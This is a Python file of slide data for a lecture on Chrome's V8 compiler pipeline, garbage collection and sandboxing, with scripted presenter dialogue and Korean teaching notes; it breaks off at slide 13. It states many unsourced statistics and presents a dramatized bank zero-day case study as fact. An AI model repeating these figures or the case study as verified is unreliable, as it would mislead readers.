# -*- coding: utf-8 -*-
"""
Oikos University - Session 9 Clean 45-Slide Master Generator
Course: The Architect of Intelligence: Mastering Agentic IT & Strategic Wisdom
Session 9: Browser Security Fortress: Demystifying Chrome V8 Engine & Manifest V3's Ad-Blocker Suppression
Features:
- Full 45 Slides with 3-Presenter Trio (Prof. Peter Kim, TA Sarah Jenkins, TA James Wilson)
- Clean 4-Part Structure (Part 1: Slide 2, Part 2: Slide 12, Part 3: Slide 23, Part 4: Slide 30)
- 5 Practical Enterprise Case Studies:
    1. Slide 11: Neutralizing Zero-Day V8 JIT Type Confusion on 10,000 Laptops
    2. Slide 22: Stopping Malicious Extension Exfiltration via Manifest V3 DNR Rules
    3. Slide 29: Cross-Site Spectre Isolation Defends $1.2M Financial Secret
    4. Slide 36: High-Speed WebAssembly Local AI Model Execution in Chrome Sandbox
    5. Slide 44: Zero-Trust Enterprise Browser Hardening ROI Blueprint
- Full sync with session9.md and slidesData.js (SLIDES_SESSION_9)
"""

import json
import re
import os
import sys

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8')

BASE_DIR = r"c:\Oikos Univ"
SLIDES_DATA_JS = os.path.join(BASE_DIR, "src", "data", "slidesData.js")
SESSION9_MD = os.path.join(BASE_DIR, "session9.md")

SLIDES_45_SESSION_9 = [
    # Slide 1: Course Title
    {
        "num": 1,
        "type": "title",
        "title": "OIKOS UNIVERSITY • SOLI DEO GLORIA",
        "subtitle": "THE ARCHITECT OF INTELLIGENCE: Mastering Agentic IT & Strategic Wisdom",
        "detail": "Session 9: Browser Security Fortress: Demystifying Chrome V8 Engine & Manifest V3's Ad-Blocker Suppression",
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab",
        "script": (
            "[Prof. Peter] Welcome back, global scholars and architects, to Oikos University! I am Professor Peter Kim, Director of Smart Insight Lab. Today on Slide 1, we enter the most ubiquitous and contested operating environment on Earth: \"Session 9: Browser Security Fortress: Demystifying Chrome V8 Engine & Manifest V3's Ad-Blocker Suppression.\"\n\n"
            "[TA Sarah] Hello everyone! I am Sarah Jenkins, Senior AI Fellow. Most people think of Google Chrome as a simple window to view web pages. But in reality, Chrome is a massive, multi-process operating system executing billions of untrusted lines of JavaScript every single second!\n\n"
            "[TA James] And I am James Wilson, your DevOps TA! From an infrastructure and security standpoint, Chrome is an engineering miracle: the V8 JIT compiler, the Orinoco garbage collector, and Site Isolation sandboxing. But Chrome is also a battleground between user cognitive privacy and Google's multi-billion dollar advertising hegemony under Manifest V3!\n\n"
            "[Prof. Peter] Under our founding motto, \"SOLI DEO GLORIA—To God Alone Be the Glory,\" let us master the technical mechanics of the browser fortress while cultivating the discernment to defend our cognitive sovereignty.\n\n"
            "[TA Sarah] Let us open Part 1 and explore the Browser as the Operating System on Slide 2!"
        ),
        "koreanGuide": {
            "summary": "Session 9 개요 및 Oikos University 3인 강사진(피터 교수, 사라 수석조교, 제임스 개발조교) 환영 인사",
            "points": [
                "강의 주제: 브라우저 보안 요새: 크롬 V8 엔진의 내부 메커니즘과 매니페스트 V3(Manifest V3) 광고 차단 억제 논쟁",
                "웹 브라우저를 단순 뷰어가 아닌 수십억 줄의 미검증 코드를 격리 실행하는 다중 프로세스 OS 관점에서 분석",
                "V8 JIT 컴파일러, 가비지 컬렉션, 사이트 격리(Site Isolation), 확장 프로그램 보안의 심층 아키텍처 규명"
            ],
            "tips": "피터 교수의 인지 주권 철학과 사라 조교의 V8 컴파일러 분석, 제임스 조교의 실전 브라우저 샌드박스 해킹 방어 관점을 유기적으로 결합하세요."
        },
        "keyTerms": [
            {
                "term": "Chrome V8 Engine",
                "def": "Google's open-source high-performance JavaScript and WebAssembly engine written in C++.",
                "defKo": "크롬 V8 엔진"
            },
            {
                "term": "Manifest V3 (MV3)",
                "def": "The modern Chrome extension platform replacing background pages with service workers and restricting dynamic network modifications.",
                "defKo": "매니페스트 V3 (MV3 확장 플랫폼)"
            }
        ]
    },
    # Slide 2: Part 1 Section Divider
    {
        "num": 2,
        "type": "section",
        "title": "PART 1: THE BROWSER AS THE OPERATING SYSTEM",
        "subtitle": "Deconstructing the V8 pipeline: Abstract Syntax Trees, Ignition Bytecode, and TurboFan JIT",
        "script": (
            "[TA Sarah] Look at Slide 2: \"PART 1: THE BROWSER AS THE OPERATING SYSTEM.\" Professor, why do computer scientists call Chrome a true operating system?\n\n"
            "[Prof. Peter] Because modern users spend 90% of their digital lives inside browser tabs! Chrome manages memory, schedules CPU threads, handles network I/O, renders 3D GPU graphics, and enforces security sandboxes—exactly like Windows or Linux!\n\n"
            "[TA James] And at the heart of this OS is the V8 engine: parsing raw JavaScript strings into Abstract Syntax Trees, compiling them into bytecode with Ignition, and optimizing hot loops into bare-metal machine code using TurboFan!\n\n"
            "[TA Sarah] In Part 1, we deconstruct the compilation pipeline and the dangerous 'Deopt Trap.'\n\n"
            "[Prof. Peter] Let us examine the Smart Insight Lab philosophy of the Browser OS on Slide 3."
        ),
        "koreanGuide": {
            "summary": "Part 1 섹션 전환: 운영체제로서의 웹 브라우저와 V8 컴파일 파이프라인",
            "points": [
                "브라우저=현대 OS: 메모리 관리, CPU 스케줄링, 3D 그래픽 렌더링, 네트워크 I/O를 전담하는 거대 플랫폼",
                "V8 컴파일 3단계: 파싱(AST) ➔ 이그니션(Ignition) 바이트코드 ➔ 터보팬(TurboFan) JIT 기계어 최적화",
                "역최적화(Deopt Trap)의 원리와 성능 급락 방지 기법"
            ],
            "tips": "사라 조교가 V8의 3단계 컴파일러 파이프라인을 명쾌하게 짚고 제임스가 터보팬 JIT의 위력을 강조합니다."
        },
        "keyTerms": [
            {
                "term": "Browser-as-an-OS",
                "def": "The conceptual paradigm recognizing modern web browsers as complete application execution runtime environments.",
                "defKo": "운영체제로서의 브라우저"
            },
            {
                "term": "Just-In-Time (JIT) Compilation",
                "def": "Compiling interpreted bytecode dynamically into native machine code at runtime based on profiling feedback.",
                "defKo": "JIT 실시간 컴파일"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 3: Smart Insight Lab: The Browser as an OS
    {
        "num": 3,
        "type": "content",
        "title": "SMART INSIGHT LAB: THE BROWSER AS AN OS",
        "subtitle": "Navigating the primary gateway through which all enterprise data, AI avatars, and attacks flow",
        "points": [
            "The Universal Shell: 90% of knowledge workers interact with software exclusively through browser windows.",
            "The Attack Surface: 85% of corporate cyberattacks begin via malicious web links, phishing, or rogue extensions.",
            "Architectural Mastery: Understanding the engine allows us to write faster code and construct impenetrable shields."
        ],
        "script": (
            "[Prof. Peter] Slide 3 presents our core conviction: \"THE BROWSER AS AN OPERATING SYSTEM.\"\n\n"
            "[TA Sarah] The browser is the single most critical software application in modern civilization. All our cloud documents, our enterprise ERPs, our AI avatars, and our bank accounts live inside browser tabs!\n\n"
            "[TA James] But because it executes untrusted code from strangers on the internet, it is also the number one target for global cybercriminals! 85% of enterprise data breaches originate inside the browser.\n\n"
            "[Prof. Peter] An Intelligence Architect must master browser internals to defend corporate truth and user assets.\n\n"
            "[TA Sarah] Let us inspect the illusion of transparency on Slide 4."
        ),
        "koreanGuide": {
            "summary": "스마트 인사이트 랩 철학: 브라우저라는 범용 쉘과 최대 공격 표면",
            "points": [
                "범용 쉘(Universal Shell): 지식 노동자의 90%가 브라우저 탭을 통해 모든 업무와 데이터를 소비",
                "최대 보안 공격 표면: 기업 사이버 침해 사고의 85%가 악성 링크, 피싱, 악성 브라우저 확장에서 시작",
                "아키텍처 숙달의 필요성: 브라우저 코어 메커니즘을 통달해야 고성능 코딩과 철통 보안이 가능"
            ],
            "tips": "피터 교수가 브라우저의 중요성을 문명사적 관점에서 설명하고 제임스가 보안 위협을 경고합니다."
        },
        "keyTerms": [
            {
                "term": "Browser Attack Surface",
                "def": "The total sum of vulnerabilities across rendering engines, JIT compilers, and extension APIs exploitable by adversaries.",
                "defKo": "브라우저 보안 공격 표면"
            },
            {
                "term": "Untrusted Code Execution",
                "def": "Running third-party JavaScript and WebAssembly payloads from unverified remote web servers safely.",
                "defKo": "미검증 원격 코드 격리 실행"
            }
        ]
    },
    # Slide 4: The Illusion of Transparency: Window vs. Fortress
    {
        "num": 4,
        "type": "content",
        "title": "THE ILLUSION OF TRANSPARENCY: WINDOW VS. FORTRESS",
        "subtitle": "Why users see a passive glass window while engineers build a hardened multi-process fortress",
        "points": [
            "User Perception: A simple transparent glass window displaying text, buttons, and videos.",
            "Engineering Reality: An iron fortress with 40 distinct operating system processes isolated by kernel sandboxes.",
            "Zero Trust Invariant: Assuming every loaded webpage is an active adversary attempting memory corruption."
        ],
        "script": (
            "[Prof. Peter] Slide 4 examines \"THE ILLUSION OF TRANSPARENCY: WINDOW VS. FORTRESS.\"\n\n"
            "[TA Sarah] To the everyday user, Chrome feels like a thin pane of glass. You type a URL, and a web page appears.\n\n"
            "[TA James] But under the hood, Chrome is an armored military base! When you open 10 tabs, Chrome spawns 40 separate OS processes—isolated by Linux seccomp filters and Windows AppContainers! Chrome operates on a strict Zero-Trust assumption: it assumes every single webpage you visit is actively trying to hack your computer!\n\n"
            "[Prof. Peter] Let us inspect the browser's 3 architectural pillars on Slide 5."
        ),
        "koreanGuide": {
            "summary": "투명성의 착시: 단순한 유리창 vs 40개 프로세스로 무장한 군사 요새",
            "points": [
                "사용자의 시각: 단순한 유리창처럼 텍스트와 비디오를 보여주는 편안한 도구",
                "공학적 진실: 탭 10개를 띄울 때 40개의 독립 OS 프로세스를 격리 실행하는 철통 군사 기지",
                "제로 트러스트(Zero-Trust) 원칙: 방문하는 모든 웹페이지가 악성코드를 심으려 한다는 전제하에 설계"
            ],
            "tips": "사라 조교와 제임스 조교가 유리창과 군사 요새의 비유를 통해 브라우저 보안의 본질을 전달합니다."
        },
        "keyTerms": [
            {
                "term": "Zero-Trust Browser Architecture",
                "def": "A security design treating all remote web content as potentially hostile and isolating it in sandboxed processes.",
                "defKo": "제로 트러스트 브라우저 아키텍처"
            },
            {
                "term": "Multi-Process Isolation",
                "def": "Distributing browser tabs, extensions, and network utilities across independent OS processes to prevent cross-contamination.",
                "defKo": "다중 프로세스 격리 체계"
            }
        ]
    },
    # Slide 5: The Browser's 3 Architectural Pillars
    {
        "num": 5,
        "type": "content",
        "title": "THE BROWSER'S 3 ARCHITECTURAL PILLARS",
        "subtitle": "The Browser Kernel, the Blink Rendering Engine, and the V8 JavaScript Engine",
        "points": [
            "Pillar 1: Browser Kernel (High-privilege master process managing tabs, network sockets, and disk storage).",
            "Pillar 2: Blink Rendering Engine (Low-privilege sandboxed process parsing HTML, CSS, and DOM layouts).",
            "Pillar 3: V8 Engine (High-speed JIT compiler executing JavaScript and WebAssembly bytecode)."
        ],
        "script": (
            "[Prof. Peter] Slide 5 outlines \"THE BROWSER'S 3 ARCHITECTURAL PILLARS.\"\n\n"
            "[TA Sarah] First is the Browser Kernel: the high-privilege master process that controls window frames, filesystem access, and network sockets. Second is the Blink Rendering Engine: a sandboxed worker that calculates CSS layouts and HTML DOM trees.\n\n"
            "[TA James] And third is the legendary V8 Engine: the C++ runtime that executes JavaScript at near-native C++ speeds! Notice the security boundary: Blink and V8 live inside a locked sandbox; only the Browser Kernel has root OS privileges!\n\n"
            "[Prof. Peter] Let us deconstruct the V8 compilation pipeline on Slide 7."
        ),
        "koreanGuide": {
            "summary": "브라우저 3대 아키텍처 기둥: 브라우저 커널, 블링크 렌더러, V8 엔진",
            "points": [
                "1대 기둥 브라우저 커널: 최고 권한을 갖고 탭, 네트워크 소켓, 파일시스템 I/O 총괄",
                "2대 기둥 블링크(Blink) 렌더러: 샌드박스 내에서 HTML, CSS, DOM 레이아웃 계산",
                "3대 기둥 V8 엔진: 자바스크립트와 WebAssembly를 C++ 수준 속도로 컴파일하는 고속 런타임"
            ],
            "tips": "사라 조교가 3대 구성 요소의 역할 분담과 권한 경계를 도식과 함께 명확히 해설합니다."
        },
        "keyTerms": [
            {
                "term": "Blink Rendering Engine",
                "def": "The open-source layout engine converting HTML, XML, and CSS into interactive visual screen pixels.",
                "defKo": "블링크 렌더링 엔진"
            },
            {
                "term": "Privilege Boundary",
                "def": "The strict architectural barrier separating low-privilege untrusted renderer processes from privileged OS kernel APIs.",
                "defKo": "특권 권한 경계선"
            }
        ]
    },
    # Slide 6: The V8 Compilation Pipeline
    {
        "num": 6,
        "type": "content",
        "title": "THE V8 ENGINE: COMPILATION PIPELINE",
        "subtitle": "From raw JavaScript text to Abstract Syntax Trees to Ignition Bytecode and TurboFan Machine Code",
        "points": [
            "Stage 1: Lexical Scanner & Parser (Transforms JavaScript source strings into Abstract Syntax Trees).",
            "Stage 2: Ignition Bytecode Interpreter (Emits memory-efficient bytecode and collects profiling feedback).",
            "Stage 3: TurboFan Optimizing JIT Compiler (Compiles hot functions into blistering native x86/ARM64 machine code)."
        ],
        "script": (
            "[TA Sarah] Slide 6 diagrammatically exposes \"THE V8 COMPILATION PIPELINE.\"\n\n"
            "[TA James] Look at how JavaScript executes: Stage 1 is the Lexical Parser, converting text into an Abstract Syntax Tree (AST). Stage 2 is Ignition, an interpreter that generates bytecode in 2 milliseconds so the page starts running instantly!\n\n"
            "[Prof. Peter] As the code runs, Ignition monitors function call frequency. If a loop is executed 1,000 times—a 'hot function'—Stage 3 kicks in: TurboFan compiles that bytecode directly into native x86 or ARM64 assembly language, executing at bare-metal silicon speed!\n\n"
            "[TA Sarah] Let us inspect the parsing phase and ASTs on Slide 7."
        ),
        "koreanGuide": {
            "summary": "V8 컴파일 파이프라인: 스캐너 ➔ AST ➔ 이그니션 바이트코드 ➔ 터보팬 기계어",
            "points": [
                "1단계 렉시컬 스캐너 & 파서: 자바스크립트 소스 텍스트를 추상 구문 트리(AST)로 변환",
                "2단계 이그니션(Ignition) 인터프리터: 2ms 만에 바이트코드를 생성해 즉시 실행 시작 및 프로파일링 정보 수집",
                "3단계 터보팬(TurboFan) JIT 컴파일러: 1,000번 이상 호출된 'Hot Function'을 네이티브 x86/ARM64 어셈블리로 직결"
            ],
            "tips": "제임스 조교와 피터 교수가 즉각 실행(Ignition)과 초고속 최적화(TurboFan)의 2단계 시너지를 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Ignition Bytecode Interpreter",
                "def": "V8's fast, memory-efficient interpreter generating intermediate bytecode and collecting type feedback.",
                "defKo": "이그니션 바이트코드 인터프리터"
            },
            {
                "term": "TurboFan Optimizing Compiler",
                "def": "V8's optimizing compiler transforming hot bytecode into highly tuned native machine code.",
                "defKo": "터보팬 최적화 JIT 컴파일러"
            }
        ]
    },
    # Slide 7: The Parsing Phase: Abstract Syntax Trees (AST)
    {
        "num": 7,
        "type": "content",
        "title": "THE PARSING PHASE: ABSTRACT SYNTAX TREES (AST)",
        "subtitle": "How V8 converts dynamic text into rigorous mathematical syntax graphs in under 5 milliseconds",
        "points": [
            "Lexical Scanning: Converting `const total = price * 1.1;` into discrete tokens (`IDENTIFIER`, `ASSIGN`, `MULTIPLY`).",
            "AST Construction: Building a hierarchical syntax tree resolving variable scopes and function declarations.",
            "Pre-Parsing Optimization: Skipping full parsing for uninvoked functions to save 40% of page startup RAM."
        ],
        "script": (
            "[Prof. Peter] Slide 7 explores \"THE PARSING PHASE: ABSTRACT SYNTAX TREES (AST).\"\n\n"
            "[TA Sarah] Before a single line of JavaScript can run, V8 must parse raw text strings into an AST syntax tree. In modern web apps with 5 megabytes of JavaScript, parsing can consume 300 milliseconds of CPU time!\n\n"
            "[TA James] To solve this, V8 uses 'Pre-Parsing'! It only fully parses functions that are called immediately on page load. Functions attached to click handlers are skipped and parsed lazily on demand, slashing initial memory and startup latency by 40%!\n\n"
            "[Prof. Peter] Let us inspect TurboFan and the dangerous Deopt Trap on Slide 8."
        ),
        "koreanGuide": {
            "summary": "파싱 단계: 추상 구문 트리(AST) 구축과 사전 파싱(Pre-Parsing) 지연 최적화",
            "points": [
                "렉시컬 스캐닝: 자바스크립트 텍스트를 식별자, 연산자, 리터럴 토큰으로 고속 분해",
                "AST 구문 트리: 스코프와 함수 선언을 담은 계층적 수학 그래프 구축",
                "사전 파싱(Pre-Parsing): 즉시 실행되지 않는 클릭 이벤트 함수는 지연 파싱하여 초기 메모리 40% 절감"
            ],
            "tips": "사라 조교가 5MB 자바스크립트를 빠르게 띄우는 프리파싱(Lazy Parsing)의 원리를 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Abstract Syntax Tree (AST)",
                "def": "A hierarchical tree representation of the abstract syntactic structure of source code.",
                "defKo": "추상 구문 트리 (AST)"
            },
            {
                "term": "Lazy Pre-Parsing",
                "def": "V8 optimization deferring the full syntax parsing of uncalled functions until first invocation.",
                "defKo": "지연 사전 파싱 (Lazy Pre-Parsing)"
            }
        ]
    },
    # Slide 8: TurboFan JIT Compiler & The Deopt Trap
    {
        "num": 8,
        "type": "content",
        "title": "TURBOFAN JIT COMPILER & THE DEOPT TRAP",
        "subtitle": "Speculative type optimization, hidden classes (Shapes), and the catastrophic deoptimization penalty",
        "points": [
            "Speculative Optimization: TurboFan assumes `add(a, b)` will ALWAYS receive Integers based on past history.",
            "Hidden Classes (Shapes): V8 creates internal C++ memory offsets for objects with identical property order.",
            "The Deopt Trap: Passing a String (`add(5, 'hello')`) shatters assumptions, forcing V8 to deoptimize back to bytecode (100X slowdown)."
        ],
        "script": (
            "[TA Sarah] Slide 8 uncovers \"TURBOFAN JIT COMPILER & THE DEOPT TRAP.\"\n\n"
            "[TA James] Why is TurboFan so fast? Because it makes 'Speculative Assumptions'! If your function `calculate(a, b)` receives integers 10,000 times, TurboFan compiles native machine code that adds raw CPU registers!\n\n"
            "[Prof. Peter] But look at what happens if you pass a String on call 10,001: `calculate(5, 'apple')`! TurboFan's assumption shatters! The CPU hits a 'Bailout Trap', throws away the native code, and deoptimizes back to the slow bytecode interpreter—causing a 100X sudden latency spike!\n\n"
            "[TA Sarah] Writing monomorphic code with stable object shapes keeps TurboFan at peak velocity.\n\n"
            "[TA James] Let us launch an interactive poll on Slide 9!"
        ),
        "koreanGuide": {
            "summary": "터보팬 JIT 컴파일러와 역최적화 함정(Deopt Trap): 100배 속도 급락의 원인",
            "points": [
                "추측 최적화(Speculative Optimization): 정수만 10,000번 들어오면 정수 전용 초고속 기계어 어셈블리로 직결",
                "히든 클래스(Shapes): 동일한 속성 순서를 가진 객체에 C++ 수준의 고정 메모리 오프셋 부여",
                "역최적화 함정(Deopt): 갑자기 문자열이 전달되면 추측이 깨지며 네이티브 코드를 버리고 느린 인터프리터로 퇴각(100배 저하)"
            ],
            "tips": "피터 교수와 제임스 조교가 10,001번째 호출에서 일어나는 역최적화(Bailout) 참사를 실감 나게 묘사합니다."
        },
        "keyTerms": [
            {
                "term": "Speculative Type Optimization",
                "def": "Generating hyper-optimized native machine instructions based on observed historical parameter types.",
                "defKo": "추측적 타입 최적화"
            },
            {
                "term": "Deoptimization (Deopt)",
                "def": "The expensive fallback mechanism where JIT machine code is discarded when dynamic runtime type assumptions fail.",
                "defKo": "역최적화 (Deopt 회귀)"
            }
        ]
    },
    # Slide 9: Interactive Poll: What Slows Down Your Browser?
    {
        "num": 9,
        "type": "poll",
        "title": "📨 INTERACTIVE POLL: BROWSER BOTTLENECKS",
        "subtitle": "When your browser consumes 12GB of RAM and starts lagging, what is the primary culprit?",
        "pollOptions": [
            "Option A: Leaking JavaScript event listeners & uncollected garbage heap objects",
            "Option B: 50 open background tabs spawning isolated multi-process memory silos",
            "Option C: Heavy third-party extensions running background service worker loops",
            "Option D: Deoptimization loops in poorly typed web application codebases"
        ],
        "script": (
            "[Prof. Peter] Slide 9 is our \"INTERACTIVE POLL: BROWSER BOTTLENECKS.\" Take out your devices and cast your vote right now!\n\n"
            "[TA Sarah] The question is: \"When your browser consumes 12 gigabytes of RAM and your laptop fan starts screaming, what is the primary culprit under the hood?\"\n\n"
            "[TA James] Option A: Leaking event listeners. Option B: 50 open tabs in multi-process silos. Option C: Heavy extensions running background loops. Or Option D: V8 deoptimization storms!\n\n"
            "[TA Sarah] Option A and Option B are tied for first place in our live poll!\n\n"
            "[Prof. Peter] Let us analyze how memory lifecycles and garbage collection operate on Slide 10."
        ),
        "koreanGuide": {
            "summary": "실시간 수강생 설문: 12GB RAM을 먹고 팬이 도는 브라우저 병목의 주범은?",
            "points": [
                "수강생 참여를 통한 실제 브라우저 메모리 폭증 및 렉 현상 원인 진단",
                "이벤트 리스너 누수, 다중 프로세스 탭 격리, 확장 프로그램 루프, V8 역최적화 중 원인 분석",
                "메모리 라이프사이클과 가비지 컬렉션(GC)의 중요성 인식"
            ],
            "tips": "3인의 강사진이 수강생들의 일상적 고통을 공유하며 2부 메모리 관리로 자연스럽게 연결합니다."
        },
        "keyTerms": [
            {
                "term": "Browser Memory Bloat",
                "def": "The excessive accumulation of RAM consumed by multi-process isolation and uncollected heap allocations.",
                "defKo": "브라우저 메모리 비대화"
            },
            {
                "term": "Event Listener Leak",
                "def": "DOM nodes retained in memory because active JavaScript event handlers prevent garbage collection.",
                "defKo": "이벤트 리스너 메모리 누수"
            }
        ]
    },
    # Slide 10: Part 1 Transition: Memory & Sandboxing
    {
        "num": 10,
        "type": "content",
        "title": "PART 1 TRANSITION: MEMORY & SANDBOXING",
        "subtitle": "Connecting compilation speed to memory lifecycles, Site Isolation, and Spectre defense",
        "points": [
            "Speed Requires Safety: Blazing TurboFan JIT is useless if an attacker exploits a type confusion bug to escape the sandbox.",
            "The Memory Lifecycle: Orinoco garbage collection cleans up short-lived objects in young generation heaps.",
            "The Roadmap Ahead: Master Orinoco GC in Part 2, Manifest V3 in Part 3, and cognitive sovereignty in Part 4."
        ],
        "script": (
            "[Prof. Peter] Slide 10 transitions our roadmap: \"PART 1 TRANSITION: ENTERING MEMORY & SANDBOXING.\"\n\n"
            "[TA Sarah] Fast compilation is amazing, but speed without memory safety is dangerous. If JIT compiler bugs allow out-of-bounds array writes, a hacker can take over the entire computer!\n\n"
            "[TA James] In Part 2, we dive into the Orinoco garbage collector, the generational heap, and Site Isolation—protecting CPU memory from Spectre and Meltdown side-channel attacks!\n\n"
            "[Prof. Peter] Let us examine our first real-world enterprise case study on Slide 11!"
        ),
        "koreanGuide": {
            "summary": "Part 1 전환: 컴파일 속도에서 메모리 안전 및 사이트 격리 요새로",
            "points": [
                "속도와 안전의 균형: JIT 컴파일이 아무리 빨라도 메모리 오염 취약점이 발생하면 해커에게 장악당함",
                "메모리 라이프사이클: 오리노코(Orinoco) 가비지 컬렉터가 단명 객체를 신속 청소",
                "Part 2~4 로드맵 제시: GC 및 사이트 격리 ➔ 매니페스트 V3 혁명 ➔ 인지 주권 수호"
            ],
            "tips": "사라 조교와 제임스 조교가 컴파일 속도와 메모리 보안의 불가분의 관계를 짚어줍니다."
        },
        "keyTerms": [
            {
                "term": "Memory Safety Invariant",
                "def": "The structural guarantee that program memory cannot be corrupted via unauthorized pointers or buffer overflows.",
                "defKo": "메모리 안전성 불변 원칙"
            },
            {
                "term": "Type Confusion Vulnerability",
                "def": "A security flaw where a program allocates memory assuming one data type but accesses it using an incompatible type.",
                "defKo": "타입 혼동 취약점 (Type Confusion)"
            }
        ]
    },
    # Slide 11: Case Study 1: Neutralizing Zero-Day V8 JIT Exploit
    {
        "num": 11,
        "type": "casestudy",
        "title": "CASE STUDY 1: NEUTRALIZING ZERO-DAY V8 EXPLOIT",
        "subtitle": "Global Investment Bank blocks in-the-wild Chrome V8 Type Confusion attack on 10,000 laptops",
        "company": "Top-Tier Wall Street Investment Bank",
        "problem": "State-sponsored cyber group launched zero-day V8 JIT type confusion exploit embedded in a financial news website, attempting remote code execution on 10,000 equity trading laptops.",
        "solution": "Bank's enterprise Chrome policy enforced strict Site Isolation, MiraclePtr memory protections, and automated v8-patch auto-restarts within 15 minutes of zero-day disclosure.",
        "impact": "Zero trading laptops compromised; attacker quarantined inside renderer sandbox; protected $4.5B in active algorithmic trading positions.",
        "script": (
            "[Prof. Peter] Slide 11 presents \"CASE STUDY 1: NEUTRALIZING ZERO-DAY V8 JIT EXPLOIT.\"\n\n"
            "[TA Sarah] A state-sponsored advanced persistent threat (APT) group discovered a zero-day type confusion vulnerability in TurboFan JIT. They weaponized a popular financial news portal: whenever an equity trader opened the article, malicious JavaScript attempted to break out of the browser and execute shellcode!\n\n"
            "[TA James] But the bank's enterprise browser architecture held the line: Chrome's Site Isolation quarantined the attack inside a low-privilege renderer sandbox! When the exploit tried to read kernel memory, Windows AppContainers blocked the syscalls, and automated enterprise patch orchestration patched 10,000 laptops in 15 minutes!\n\n"
            "[Prof. Peter] Over 4.5 billion dollars in trading positions were protected with zero leaks! That is the power of multi-layer browser sandboxing.\n\n"
            "[TA Sarah] Now let us open Part 2 and master Memory, Sandboxing, and Site Isolation on Slide 12!"
        ),
        "koreanGuide": {
            "summary": "케이스 스터디 1: 월가 투자은행 10,000대 트레이딩 PC의 V8 제로데이 공격 완벽 방어",
            "points": [
                "문제 상황: 국가 배후 해커 조직이 금융 뉴스 사이트에 V8 터보팬 제로데이(타입 혼동)를 심어 원격 코드 실행 시도",
                "솔루션: 사이트 격리(Site Isolation), MiraclePtr 메모리 방어, 15분 만의 전사 긴급 패치 오케스트레이션 가동",
                "성과: 10,000대 PC 침해 0건, 렌더러 샌드박스 내부 격리 완결, 45억 달러 규모 알고리즘 트레이딩 자산 완벽 수호"
            ],
            "tips": "사라 조교와 제임스 조교가 제로데이 공격을 렌더러 샌드박스 안에 가두어 무력화한 실화를 생생하게 전달합니다."
        },
        "keyTerms": [
            {
                "term": "Zero-Day V8 JIT Exploit",
                "def": "An unpatched vulnerability in Chrome's JavaScript compiler weaponized by adversaries prior to vendor patch release.",
                "defKo": "V8 JIT 제로데이 익스플로잇"
            },
            {
                "term": "AppContainer Sandbox",
                "def": "Windows OS-level isolation boundary restricting process access to network, filesystem, and inter-process handles.",
                "defKo": "AppContainer 샌드박스 격리"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 12: Part 2 Section Divider
    {
        "num": 12,
        "type": "section",
        "title": "PART 2: MEMORY, SANDBOXING & SITE ISOLATION",
        "subtitle": "Generational garbage collection (Orinoco), OS privilege separation, and Spectre/Meltdown defense",
        "script": (
            "[TA Sarah] Look at Slide 12: \"PART 2: MEMORY, SANDBOXING & SITE ISOLATION.\" Now we step deep into Chrome's memory management engine!\n\n"
            "[Prof. Peter] Memory is the physical battlefield of computing. How Chrome allocates, garbage-collects, and isolates memory across processes determines both application speed and cryptographic safety.\n\n"
            "[TA James] In Part 2, we deconstruct the Orinoco garbage collector—the Scavenger vs. Mark-Sweep-Compact—the Renderer vs. Browser Kernel privilege separation, and how Site Isolation neutralizes Spectre side-channel attacks!\n\n"
            "[TA Sarah] Let us inspect Young vs. Old Generation memory lifecycles on Slide 13!"
        ),
        "koreanGuide": {
            "summary": "Part 2 섹션 전환: 메모리 관리, 오리노코(Orinoco) GC, 사이트 격리",
            "points": [
                "메모리: 컴퓨팅의 물리적 전장이자 성능과 보안을 결정짓는 핵심 영역",
                "오리노코 가비지 컬렉터: 세대별 힙 구조 (신세대 스캐빈저 vs 구세대 마크-스윕-컴팩트)",
                "렌더러와 브라우저 커널 간 특권 분리 및 스펙터(Spectre) 사이드 채널 방어"
            ],
            "tips": "피터 교수가 메모리의 물리적 중요성을 선언하고 제임스가 오리노코 GC의 메커니즘을 예고합니다."
        },
        "keyTerms": [
            {
                "term": "Generational Heap",
                "def": "A memory management strategy partitioning objects by age based on the empirical observation that most objects die young.",
                "defKo": "세대별 힙 메모리 (Generational Heap)"
            },
            {
                "term": "Orinoco Garbage Collector",
                "def": "V8's modern concurrent, parallel, and incremental garbage collection subsystem.",
                "defKo": "오리노코(Orinoco) 가비지 컬렉터"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 13: Memory Lifecycles: Young vs. Old Generations
    {
        "num": 13,
        "type": "content",
        "title": "MEMORY LIFECYCLES: YOUNG VS. OLD GENERATIONS",
        "subtitle": "The Generational Hypothesis: 95% of allocated objects die within milliseconds of creation",
        "points": [
            "Young Generation (1MB - 64MB): Short-lived function local variables, temporary strings, and loop counters.",
            "Old Generation (Up to 4GB): Long-lived singleton state, DOM tree nodes, and global caches.",
            "Promotion Policy: Objects surviving two minor GC cycles are automatically promoted to the Old Generation."
        ],
        "script": (
            "[Prof. Peter] Slide 13 diagrams \"MEMORY LIFECYCLES: YOUNG VS. OLD GENERATIONS.\"\n\n"
            "[TA Sarah] Computer scientists discovered the 'Generational Hypothesis': in almost all software, 95% of allocated objects die within 10 milliseconds of creation! For example, temporary strings inside a loop!\n\n"
            "[TA James] So V8 splits heap memory into two zones: The Young Generation is small and cleaned up in 1 millisecond using parallel scavengers! Objects that survive two cleaning cycles prove they are durable, so V8 'promotes' them into the Old Generation!\n\n"
            "[Prof. Peter] Let us inspect the Orinoco Restaurant Metaphor on Slide 14."
        ),
        "koreanGuide": {
            "summary": "메모리 라이프사이클: 신세대(Young) vs 구세대(Old) 및 세대 가설",
            "points": [
                "세대 가설(Generational Hypothesis): 생성된 객체의 95%는 10밀리초 이내에 소멸한다는 경험적 법칙",
                "신세대 힙 (1~64MB): 임시 변수, 문자열 연산 결과 등 단명 객체를 1ms 만에 초고속 수거",
                "승격 정책(Promotion): 2번의 마이너 GC를 버텨낸 장수 객체만 구세대 힙(최대 4GB)으로 이동"
            ],
            "tips": "사라 조교가 세대 가설의 통계를 제시하고 제임스가 승격(Promotion)의 메커니즘을 설명합니다."
